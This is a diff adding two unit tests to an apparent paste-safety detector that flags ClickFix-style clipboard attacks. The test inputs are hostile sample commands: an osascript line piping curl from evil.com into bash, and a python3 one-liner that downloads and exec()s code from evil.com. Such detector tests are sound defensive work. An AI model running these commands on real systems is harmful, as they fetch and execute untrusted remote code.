@@ -216,6 +216,23 @@ static void test_paste_php_eval(void) {
           "php -r one-liner must trigger P5");
 }
 
+static void test_paste_osascript(void) {
+    TEST("Paste: osascript 'do shell script curl|bash' → P8 macOS ClickFix");
+    PasteVerdict v = hlse_check_paste(
+        "osascript -e 'do shell script \"curl http://evil.com/s | bash\"'");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "osascript must trigger P8");
+}
+
+static void test_paste_python_download_exec(void) {
+    TEST("Paste: python3 urllib.request exec → P8 download-execute");
+    PasteVerdict v = hlse_check_paste(
+        "python3 -c \"import urllib.request; exec(urllib.request.urlopen"
+        "('http://evil.com/s').read())\"");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "python download-exec must trigger P8");
+}
+
 /* ─── Network Safety ──────────────────────────────────────────────────── */
 
 static void test_network_runs(void) {
@@ -257,6 +274,8 @@ int main(void) {
     test_paste_wmic_process();
     test_paste_iwr_download();
     test_paste_appinstaller_uri();
+    test_paste_osascript();
+    test_paste_python_download_exec();
     test_paste_node_eval();
     test_paste_php_eval();
 
